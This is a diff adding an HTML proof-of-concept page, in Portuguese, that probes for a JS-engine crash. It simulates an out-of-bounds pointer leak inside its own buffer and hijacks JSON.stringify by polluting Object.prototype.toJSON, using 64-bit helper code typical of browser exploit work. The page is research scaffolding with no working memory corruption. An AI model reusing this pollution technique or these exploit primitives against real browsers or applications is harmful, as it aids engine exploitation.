@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>PoC Isolado v2.3 - Crash JSON.stringify</title>
+    <style>
+        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
+        #output {
+            background: #222;
+            border: 1px solid #444;
+            padding: 10px;
+            height: 80vh;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-top: 10px;
+        }
+        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
+        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <h1>PoC Isolado v2.3 para Teste de Crash em JSON.stringify</h1>
+    <p>Este script tenta simular um vazamento OOB e interage com JSON.stringify.<br>Nesta versão (v2.3), o 'toJSON' poluído retorna informações de 'this' (Object.keys).</p>
+    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste Isolado v2.3</button>
+    <div id="output"></div>
+
+    <script>
+        // --- Utilitários e Constantes Globais (Adaptado da Suite v19.0) ---
+        // ... (Código de AdvancedInt64 e generalUtils mantido como nas versões anteriores) ...
+        class AdvancedInt64 {
+            constructor(low, high) {
+                let buffer = new Uint32Array(2);
+                let bytes = new Uint8Array(buffer.buffer);
+                if (arguments.length > 2) { throw TypeError('AdvancedInt64 takes at most 2 args'); }
+                if (arguments.length === 0) { throw TypeError('AdvancedInt64 takes at min 1 args'); }
+                let is_one = false;
+                if (arguments.length === 1) { is_one = true; }
+                if (!is_one) {
+                    if (typeof (low) !== 'number' && typeof (high) !== 'number') {
+                        throw TypeError('low/high must be numbers');
+                    }
+                }
+                const check_range = (x) => (-0x80000000 <= x) && (x <= 0xffffffff);
+                if (typeof low === 'number') {
+                    if (!check_range(low)) { throw TypeError('low not a valid value: ' + low); }
+                    if (is_one) {
+                        high = 0;
+                        if (low < 0) { high = -1; }
+                    } else {
+                        if (!check_range(high)) { throw TypeError('high not a valid value: ' + high); }
+                    }
+                    buffer[0] = low;
+                    buffer[1] = high;
+                } else if (typeof low === 'string') {
+                    let hexstr = low;
+                    if (hexstr.substring(0, 2) === "0x") { hexstr = hexstr.substring(2); }
+                    if (hexstr.length % 2 === 1) { hexstr = '0' + hexstr; }
+                    if (hexstr.length > 16) { hexstr = hexstr.substring(hexstr.length - 16); }
+                    else { hexstr = hexstr.padStart(16, '0');}
+                    for (let i = 0; i < 8; i++) {
+                        bytes[i] = parseInt(hexstr.slice(14 - i*2, 16 - i*2), 16);
+                    }
+                } else if (typeof low === 'object') {
+                    if (low instanceof AdvancedInt64) {
+                        bytes.set(low.bytes);
+                    } else if (low.length === 8) {
+                        bytes.set(low);
+                    } else { throw TypeError("Array must have exactly 8 elements."); }
+                } else {
+                    throw TypeError('AdvancedInt64 does not support your object for conversion');
+                }
+                this.buffer = buffer;
+                this.bytes = bytes;
+            }
+            low() { return this.buffer[0]; }
+            high() { return this.buffer[1]; }
+            toString(is_pretty) {
+                let lowStr = this.low().toString(16).padStart(8, '0');
+                let highStr = this.high().toString(16).padStart(8, '0');
+                if (is_pretty) {
+                    highStr = highStr.substring(0, 4) + '_' + highStr.substring(4);
+                    lowStr = lowStr.substring(0, 4) + '_' + lowStr.substring(4);
+                    return '0x' + highStr + '_' + lowStr;
+                }
+                return '0x' + highStr + lowStr;
+            }
+        }
+
+        const generalUtils = {
+            logToDiv: (divId, message, type = 'info', funcName = '') => {
+                const outputDiv = document.getElementById(divId);
+                if (!outputDiv) return;
+                try {
+                    const timestamp = `[${new Date().toLocaleTimeString()}]`;
+                    const prefix = funcName ? `[${funcName}] ` : '';
+                    const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                    const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
+                    if(outputDiv.innerHTML.length > 300000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 150000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; }
+                    outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
+                    outputDiv.scrollTop = outputDiv.scrollHeight;
+                } catch(e) { console.error(`Erro no log para ${divId}:`, e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
+            }
+        };
+
+
+        // --- Script Isolado v2.3 (Foco: JSON.stringify Crash) ---
+        const outputDivS1 = document.getElementById('output');
+        const runBtn = document.getElementById('runBtn');
+        const SHORT_PAUSE_S1 = 50;
+        const MEDIUM_PAUSE_S1 = 200;
+        let leakedValueFromOOB_S1 = null; 
+
+        const logS1 = (message, type = 'info', funcName = '') => {
+            generalUtils.logToDiv('output', message, type, funcName);
+        };
+
+        const PAUSE_S1_FUNC = (ms = SHORT_PAUSE_S1) => new Promise(r => setTimeout(r, ms));
+        const toHexS1 = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
+        
+        const simulateOOBLeakAndStoreS1 = async () => { // ... (código de simulateOOBLeakAndStoreS1 mantido como antes) ...
+            const FNAME = 'simulateOOBLeakAndStoreS1';
+            logS1("--- Iniciando Teste: Simulação de OOB Write/Read (Leak) ---", 'test', FNAME);
+            const bufferSize = 32;
+            const oobWriteOffset = bufferSize; 
+            const allocationSize = bufferSize + 256; 
+            const baseOffsetInBuffer = 128; 
+            const targetLeakedHigh = 0xAAAAAAAA;
+            const targetLeakedLow  = 0xAAAAAAAA;
+            const targetLeakedOffset = 28; 
+            leakedValueFromOOB_S1 = null;
+            try {
+                const outerBuffer = new ArrayBuffer(allocationSize);
+                const dataView = new DataView(outerBuffer);
+                for (let i = 0; i < outerBuffer.byteLength; i++) {
+                    dataView.setUint8(i, 0xCC);
+                }
+                const leakPlantAddress = baseOffsetInBuffer + targetLeakedOffset;
+                if (leakPlantAddress + 8 <= outerBuffer.byteLength) {
+                    dataView.setUint32(leakPlantAddress + 4, targetLeakedHigh, true); 
+                    dataView.setUint32(leakPlantAddress,     targetLeakedLow,  true); 
+                    logS1(`SIMULAÇÃO: Valor "vazado" 0x${targetLeakedHigh.toString(16)}${targetLeakedLow.toString(16)} plantado em @${targetLeakedOffset} (addr ${leakPlantAddress})`, 'info', FNAME);
+                } else {
+                    logS1(`ERRO SIMULAÇÃO: Endereço para plantar leak (${leakPlantAddress}) fora dos limites do outerBuffer.`, 'error', FNAME);
+                    return false;
+                }
+                await PAUSE_S1_FUNC();
+                const readTargetAddress = baseOffsetInBuffer + targetLeakedOffset;
+                if (readTargetAddress >= 0 && readTargetAddress + 8 <= outerBuffer.byteLength) {
+                    try {
+                        const low = dataView.getUint32(readTargetAddress, true);
+                        const high = dataView.getUint32(readTargetAddress + 4, true);
+                        if (high === targetLeakedHigh && low === targetLeakedLow) {
+                            const vStr = `H=${toHexS1(high)} L=${toHexS1(low)}`;
+                            logS1(` -> PTR? U64 @${targetLeakedOffset} (addr ${readTargetAddress}): ${vStr}`, 'ptr', FNAME);
+                            leakedValueFromOOB_S1 = { high, low, type: 'U64', offset: targetLeakedOffset };
+                            logS1(` -> VALOR U64 ARMAZENADO (Simulado com Sucesso) @${targetLeakedOffset}.`, 'vuln', FNAME);
+                            logS1(` ---> ALERTA: Simulação de Primitivo Relevante (OOB Read Pointer Leak) BEM SUCEDIDA ***`, 'escalation', FNAME);
+                        } else {
+                             logS1(` -> VALOR U64 LIDO DIVERGE DO ESPERADO @${targetLeakedOffset}.`, 'warn', FNAME);
+                        }
+                    } catch (e) {
+                        logS1(`Erro ao tentar ler U64 em @${targetLeakedOffset}: ${e.message}`, 'error', FNAME);
+                    }
+                } else {
+                    logS1(`Endereço de leitura OOB simulado @${targetLeakedOffset} fora dos limites.`, 'warn', FNAME);
+                }
+            } catch (e) {
+                logS1(`Erro fatal na simulação OOB: ${e.message}`, 'error', FNAME);
+                console.error(e);
+            } finally {
+                const leakStatus = leakedValueFromOOB_S1 ? `1 valor ${leakedValueFromOOB_S1.type} @${leakedValueFromOOB_S1.offset}` : 'nenhum valor simulado/armazenado';
+                logS1(`--- Teste Simulação OOB Concluído (${leakStatus}) ---`, 'test', FNAME);
+            }
+            return !!leakedValueFromOOB_S1;
+        };
+
+        const testPPJsonHijackAndUseLeakS1 = async () => {
+            const FNAME = 'testPPJsonHijackAndUseLeakS1_v2_3';
+            logS1("--- Iniciando Teste v2.3: PP Hijack (JSON.stringify) com toJSON acessando 'this' ---", 'test', FNAME);
+            
+            const ppKey = 'toJSON'; 
+            let originalToJSON; 
+            let ppAppliedSuccessfully = false; 
+
+            let hijackOK = false; 
+            let hijackReturnOK = false;
+            // leakUsedOK não é mais tão relevante aqui, já que não estamos focando no leakedValueFromOOB_S1 no retorno
+
+            const testObject = { a: 1, b: 'test_data', c: { nested: true } };
+
+            try {
+                const descriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+                if (descriptor) {
+                    originalToJSON = descriptor.value;
+                }
+
+                // MODIFICAÇÃO v2.3: toJSON agora acessa 'this' para obter Object.keys(this)
+                Object.prototype[ppKey] = function() {
+                    logS1(`===> Poluição Object.prototype.toJSON ATIVADA (acessando 'this') <===`, 'vuln', FNAME);
+                    let keys = [];
+                    try {
+                        keys = Object.keys(this); // PONTO POTENCIALMENTE CRÍTICO SE 'this' ESTIVER CORROMPIDO
+                    } catch (e) {
+                        logS1(`ERRO ao tentar Object.keys(this) dentro do toJSON: ${e.message}`, 'error', FNAME);
+                        // Mesmo com erro, podemos tentar retornar algo para ver se o stringify externo ainda trava
+                        return { "toJSON_error_getting_keys": true, "error_message": String(e.message) };
+                    }
+                    return { "toJSON_called_successfully": true, "object_keys": keys }; 
+                };
+                ppAppliedSuccessfully = true;
+                logS1(`Poluição Object.prototype.${ppKey} aplicada (versão acessando 'this').`, 'info', FNAME);
+
+                logS1(`Tentando JSON.stringify com testObject... (Esta é a chamada que pode travar o navegador)`, 'info', FNAME);
+                const result = JSON.stringify(testObject); // PONTO CRÍTICO
+                logS1(`Resultado de JSON.stringify (com toJSON acessando 'this'): ${result}`, 'info', FNAME);
+
+                if (result && result.includes('"toJSON_called_successfully":true')) {
+                    logS1("VULN: Poluição via Object.prototype.toJSON (acessando 'this') afetou JSON.stringify!", 'vuln', FNAME);
+                    hijackOK = true;
+                } else if (result && result.includes('"toJSON_error_getting_keys":true')) {
+                    logS1("AVISO: Object.prototype.toJSON foi chamado, mas houve um erro ao obter Object.keys(this).", 'warn', FNAME);
+                    // Ainda podemos considerar um tipo de "hijack" parcial se o toJSON foi invocado.
+                    hijackOK = true; 
+                }
+                if (hijackOK) hijackReturnOK = true;
+
+            } catch (e) {
+                logS1(`Erro fatal durante Teste JSON.stringify: ${e.message}`, 'error', FNAME);
+                console.error("JSON.stringify Crash Test Error:", e);
+                logS1("Possível CRASH AQUI ou erro inesperado! Verifique o console do debugger do motor JS.", 'critical', FNAME);
+            } finally {
+                if (ppAppliedSuccessfully) { 
+                    if (typeof originalToJSON !== 'undefined') {
+                        Object.defineProperty(Object.prototype, ppKey, { value: originalToJSON, writable: true, enumerable: false, configurable: true });
+                    } else {
+                        delete Object.prototype[ppKey];
+                    }
+                    logS1(`Object.prototype.${ppKey} restaurado.`, 'good', 'Cleanup');
+                }
+            }
+            logS1(`--- Teste JSON.stringify v2.3 Concluído (Poluição 'this': ${hijackOK}, Retorno Verif.: ${hijackReturnOK}) ---`, 'test', FNAME);
+            return hijackReturnOK;
+        };
+
+        const runIsolatedTest = async () => {
+            if (runBtn) runBtn.disabled = true;
+            outputDivS1.innerHTML = '';
+            logS1("==== INICIANDO PoC Isolado v2.3 ====", 'test', 'runIsolatedTest');
+            await simulateOOBLeakAndStoreS1(); 
+            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
+            
+            await testPPJsonHijackAndUseLeakS1();
+            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
+
+            logS1("\n==== PoC Isolado v2.3 CONCLUÍDO ====", 'test', 'runIsolatedTest');
+            logS1("Se o navegador TRAVOU, o problema é MUITO PROVAVELMENTE o acesso a 'this' (ex: Object.keys(this)) dentro do 'toJSON' poluído, quando 'this' pode estar corrompido.", 'info', 'runIsolatedTest');
+            logS1("Se NÃO travou, então o travamento original era ainda mais sutil, possivelmente uma combinação do acesso a 'this' E a tentativa de serializar o 'leakedValueFromOOB_S1'.", 'info', 'runIsolatedTest');
+            if (runBtn) runBtn.disabled = false;
+        };
+    </script>
+</body>
+</html>
